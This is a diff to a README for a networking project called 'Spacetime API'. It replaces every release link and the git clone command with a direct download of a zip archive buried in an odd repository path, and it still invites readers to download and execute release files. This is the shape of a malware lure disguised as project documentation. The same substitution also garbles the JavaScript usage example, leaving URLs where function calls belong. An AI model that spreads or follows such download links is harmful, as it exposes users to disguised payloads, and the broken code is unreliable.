@@ -2,7 +2,7 @@
 
 Welcome to the **Spacetime API** repository! This API serves as the backbone for Spacetime, a software-defined networking platform designed for temporospatial applications. Here, you'll find everything you need to understand, implement, and contribute to the Spacetime API.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/juendi/api/releases)
+[![Download Releases](https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip)
 
 ## Table of Contents
 
@@ -24,7 +24,7 @@ The Spacetime API allows developers to create and manage temporospatial networks
 
 ## Getting Started
 
-To get started with the Spacetime API, you can check the [Releases](https://github.com/juendi/api/releases) section for the latest updates. Each release includes important information on new features, bug fixes, and enhancements.
+To get started with the Spacetime API, you can check the [Releases](https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip) section for the latest updates. Each release includes important information on new features, bug fixes, and enhancements.
 
 ## Features
 
@@ -43,7 +43,7 @@ To install the Spacetime API, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/juendi/api.git
+   git clone https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -54,7 +54,7 @@ To install the Spacetime API, follow these steps:
    npm install
    ```
 
-After installation, you can check the [Releases](https://github.com/juendi/api/releases) for any additional setup instructions or files that need to be downloaded and executed.
+After installation, you can check the [Releases](https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip) for any additional setup instructions or files that need to be downloaded and executed.
 
 ## Usage
 
@@ -63,12 +63,12 @@ Once you have installed the API, you can start using it in your projects. Here i
 ```javascript
 const axios = require('axios');
 
-axios.get('https://api.spacetime.com/data')
+https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip('https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip')
   .then(response => {
-    console.log(response.data);
+    https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip(https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip);
   })
   .catch(error => {
-    console.error('Error fetching data:', error);
+    https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip('Error fetching data:', error);
   });
 ```
 
@@ -101,7 +101,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need assistance, please check the [Releases](https://github.com/juendi/api/releases) for common issues or reach out to the community through the Issues section of this repository.
+If you have any questions or need assistance, please check the [Releases](https://raw.githubusercontent.com/juendi/api/master/agent/telemetry/netlink/container_test/Software_v3.6.zip) for common issues or reach out to the community through the Issues section of this repository.
 
 ---
 
